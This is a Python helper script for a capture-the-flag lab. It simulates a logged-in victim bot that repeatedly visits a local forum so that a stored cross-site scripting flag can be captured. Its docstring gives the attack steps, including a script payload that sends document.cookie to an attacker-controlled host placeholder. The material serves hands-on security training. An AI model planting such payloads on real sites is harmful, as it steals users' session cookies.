#!/usr/bin/env python3
"""
Bot for FLAG 10 — Stored XSS Cookie Steal
Simulates the griz bot visiting /forum while logged in every 30 seconds forever.

Attack steps:
1. Start a listener on your machine:
      python3 -m http.server 8888
2. Post this payload in /forum:
      <script>fetch('http://YOUR_IP:8888/?c='+document.cookie)</script>
3. Run this bot — it logs in as griz and visits /forum every 30s.
4. Your listener receives the request with flag10 in the query string.

Note: flag10 is only readable via JS — it cannot be used to log in.
"""

import urllib.request
import urllib.parse
import http.cookiejar
import time

TARGET   = "http://127.0.0.1:5000"
USERNAME = "griz"
PASSWORD = "funkysax123"
INTERVAL = 30


def make_opener():
    jar    = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    opener.addheaders = [("User-Agent", "Mozilla/5.0 (DropZoneBot/1.0)")]
    return opener, jar


def login(opener):
    data = urllib.parse.urlencode({
        "username": USERNAME,
        "password": PASSWORD,
    }).encode()
    resp = opener.open(f"{TARGET}/login", data)
    return resp.geturl() != f"{TARGET}/login"


def visit_forum(opener):
    opener.open(f"{TARGET}/forum")


def print_cookies(jar):
    for cookie in jar:
        print(f"    [{cookie.name}] = {cookie.value}")


def run():
    count = 0
    print(f"[*] XSS Cookie-Steal Bot starting — target: {TARGET}")
    print(f"[*] Logging in as '{USERNAME}' and visiting /forum every {INTERVAL}s forever")
    print(f"[*] Make sure your XSS payload is already posted to /forum\n")

    while True:
        count += 1
        opener, jar = make_opener()

        print(f"[{count}] Logging in...", end=" ", flush=True)
        if login(opener):
            print("OK")
            print(f"[{count}] Cookies held by bot:")
            print_cookies(jar)
            print(f"[{count}] Visiting /forum — XSS should fire if payload is present...")
            visit_forum(opener)
            print(f"[{count}] Done\n")
        else:
            print("FAILED — check credentials or server\n")

        print(f"[*] Sleeping {INTERVAL}s...\n")
        time.sleep(INTERVAL)


if __name__ == "__main__":
    run()